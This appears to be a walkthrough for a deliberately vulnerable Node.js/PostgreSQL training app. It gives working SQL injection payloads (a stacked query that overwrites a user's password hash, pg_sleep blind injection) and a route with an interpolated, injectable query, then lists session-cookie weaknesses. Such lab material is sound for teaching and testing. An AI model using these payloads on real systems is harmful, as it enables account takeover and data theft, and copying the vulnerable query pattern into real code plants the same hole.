 

## SQL Injection Steps

* Bypass login function with sql injection
 - The following can be used to guess a password, but you can change the query accordingly
 ```
 /login password field, replaces your hash!
 test'; INSERT INTO users (username,password) VALUES ('test', '$2y$10$x6PXZnQoodybWH/kmtwEQeKf7PasRSGvb7zaEQ.y0xGFrbntiUqpW') ON CONFLICT (username) DO UPDATE SET password='$2y$10$x6PXZnQoodybWH/kmtwEQeKf7PasRSGvb7zaEQ.y0xGFrbntiUqpW';--
 ```
 - Possible variation assuming we DON'T know the name of the password field.
```
test'; SELECT CASE WHEN ((SELECT password from users where username='admin'))='admin1' THEN (select pg_sleep(5)) ELSE NULL END;--
``` 

* Try a blind scenario to get the DB name
- If your database name is "postgres" this will work otherwise use something like intruder to build out the query and dump the db name based on time responses

```
/register username field
johnny','test'); SELECT CASE WHEN (SUBSTR((SELECT current_database()),1,1))='a' THEN (select pg_sleep(3)) ELSE NULL END;--
```
 - Read Jakes blog about safe sql injection!

* Set up a reflected scenario that will print SQL results to you in the UI and get info from it

```
/forgot
router.post('/forgot', async function(req, res, next) {
  console.log(`SELECT * from users where username='${req.body.username}';`);
  var db_response = await client.query(`SELECT * from users where username='${req.body.username}';`);
  console.log(db_response);
  var username_return = '';
  db_response.rows.forEach(element => username_return+=element.username);
  res.render('forgot_valid',{user:username_return});
});
```
Try and send a password reset for username `' OR '1'='1`


 SELECT current_database()

 test'; SELECT CASE WHEN ((SELECT password from users where username='admin'))='admin1' THEN (select pg_sleep(5)) ELSE NULL END;--

## Cookie vulns

### Boils down to 2 vulns, weakness in token generation or weakness in session token handling

#### Weakness in token generation
  <b>Predicatble tokens</b>
 * Current cookie creation does not implement sufficient entropy, thus the cookies are brute forceable!
 Cookie follows general pattern of `xyz$d$d$d$d$d` where `$d` represents a number 0-9
 * Immediately noticeable pattern
 
#### Weakness in session handling

<b>Disclosure of Tokens on Network</b>
* Not using HTTPS, application and client are sending session token over the network in plain text.

<b>Vulnerable mapping of tokens to sessions</b>
* Multiple valid tokens are allowed to be assigned concurrently to the same user account

<b>Vulnerable session termination</b>
* No logout function
* Cookies do not time out browser side
* Server does not perform session destruction, auth token still associated with the user on the backend for whom it was issued

* <i>SQL Injection note: passwords are bcrypt hashed, however if you are able to dump the sessions table, since the sessions are persistent theres no reason to go for the passwords as you can just simply use an auth token to authenticate as a user</i>

<b>Cookie scope</b>
* Session cookies are not scoped to a particular domain


* Token currently not sent in hidden form field! CSRF is much easier in that case
